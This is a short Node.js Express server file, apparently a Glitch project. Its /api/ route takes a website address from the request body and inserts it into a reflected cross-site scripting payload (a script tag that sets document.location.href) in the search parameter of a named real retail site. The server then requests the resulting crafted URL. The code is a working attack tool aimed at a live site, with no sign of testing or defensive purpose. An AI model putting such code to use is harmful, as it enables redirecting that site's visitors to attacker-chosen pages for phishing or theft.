// server.js
// where your node app starts

// init project
const express = require('express');
const https = require('https');
const app = express();
var bodyParser  = require('body-parser');
// we've started you off with Express, 
// but feel free to use whatever libs or frameworks you'd like through `package.json`.
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
// http://expressjs.com/en/starter/static-files.html
app.use(express.static('public'));

// http://expressjs.com/en/starter/basic-routing.html
app.get('/', function(request, response) {
  response.sendFile(__dirname + '/views/index.html');
});


app.post('/api/',(req,res)=>{
  
  // var opt = {
  //   hostname:"recondite-cabin.glitch.me",
  //   path:"/getReq",
  //   method: "GET"
  // }
  console.log("here",req.body);
  // var req = https.request(opt, (resp)=>{
  //   console.log("req send",resp);
  // });
  var u = req.body.Website;
  var link = 'https://www.woodlandworldwide.com/wnew/faces/search.jsp?searchkey="<script>document.location.href="<zzz>"</script>';
  var parts = link.split("<zzz>");
  link = parts[0]+u+parts[1];
  console.log(link);
  https.get(link,(d)=>{
    console.log("done",d);
  // https.get(u);      
   });
});

// listen for requests :)
const listener = app.listen(process.env.PORT, function() {
  console.log('Your app is listening on port ' + listener.address().port);
});
